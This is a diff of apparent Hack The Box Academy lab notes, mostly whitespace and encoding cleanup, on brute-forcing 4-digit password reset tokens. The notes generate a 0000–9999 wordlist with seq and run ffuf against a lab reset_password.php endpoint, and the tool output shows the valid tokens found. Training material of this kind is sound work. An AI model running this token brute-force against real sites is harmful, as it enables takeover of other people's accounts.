@@ -28,19 +28,19 @@ Please note that this link will expire in 24 hours, so please complete the passw
 Thank you.
 ```
 
-As we can see, the password reset link contains the reset token in the GET-parameterÂ `token`. In this example, the token isÂ `7351`. Given that the token consists of only a 4-digit number, there can be onlyÂ `10,000`Â possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.
+As we can see, the password reset link contains the reset token in the GET-parameter`token`. In this example, the token is`7351`. Given that the token consists of only a 4-digit number, there can be only`10,000` possible values. This allows us to hijack users' accounts by requesting a password reset and then brute-forcing the token.
 
 ---
 
 ## Attacking Weak Reset Tokens
 
-We will useÂ `ffuf`Â to brute-force all possible reset tokens. First, we need to create a wordlist of all possible tokens fromÂ `0000`Â toÂ `9999`, which we can achieve withÂ `seq`:
+We will use`ffuf` to brute-force all possible reset tokens. First, we need to create a wordlist of all possible tokens from`0000` to`9999`, which we can achieve with`seq`:
 
 ```bash
 smoothment@htb[/htb]$ seq -w 0 9999 > tokens.txt
 ```
 
-TheÂ `-w`Â flag pads all numbers to the same length by prepending zeroes, which we can verify by looking at the first few lines of the output file:
+The`-w` flag pads all numbers to the same length by prepending zeroes, which we can verify by looking at the first few lines of the output file:
 
 ```bash
 smoothment@htb[/htb]$ head tokens.txt
@@ -57,7 +57,7 @@ smoothment@htb[/htb]$ head tokens.txt
 0009
 ```
 
-Assuming that there are users currently in the process of resetting their passwords, we can try to brute-force all active reset tokens. If we want to target a specific user, we should send a password reset request for that user first to create a reset token. We can then specify the wordlist inÂ `ffuf`Â to brute-force all active reset-tokens:
+Assuming that there are users currently in the process of resetting their passwords, we can try to brute-force all active reset tokens. If we want to target a specific user, we should send a password reset request for that user first to create a reset token. We can then specify the wordlist in`ffuf` to brute-force all active reset-tokens:
 
 
 ```bash
@@ -66,10 +66,10 @@ smoothment@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_passwo
 <SNIP>
 
 [Status: 200, Size: 2667, Words: 538, Lines: 90, Duration: 1ms]
-    * FUZZ: 6182
+ * FUZZ: 6182
 ```
 
-By specifying the reset token in the GET-parameterÂ `token`Â in theÂ `/reset_password.php`Â endpoint, we can reset the password of the corresponding account, enabling us to take over the account:
+By specifying the reset token in the GET-parameter`token` in the`/reset_password.php` endpoint, we can reset the password of the corresponding account, enabling us to take over the account:
 
 ![](https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_2.png)
 
@@ -120,28 +120,28 @@ After a while, we get the following:
 ```
 ffuf -w ./tokens.txt -u "http://94.237.54.164:33815/reset_password.php?token=FUZZ" -fr "The provided token is invalid" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://94.237.54.164:33815/reset_password.php?token=FUZZ
- :: Wordlist         : FUZZ: /home/samsepiol/tokens.txt
+ :: Method : GET
+ :: URL : http://94.237.54.164:33815/reset_password.php?token=FUZZ
+ :: Wordlist : FUZZ: /home/samsepiol/tokens.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
- :: Filter           : Regexp: The provided token is invalid
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter : Regexp: The provided token is invalid
 ________________________________________________
 
-6583                    [Status: 200, Size: 2920, Words: 596, Lines: 92, Duration: 3672ms]
+6583 [Status: 200, Size: 2920, Words: 596, Lines: 92, Duration: 3672ms]
 ```
 
 Got our token:
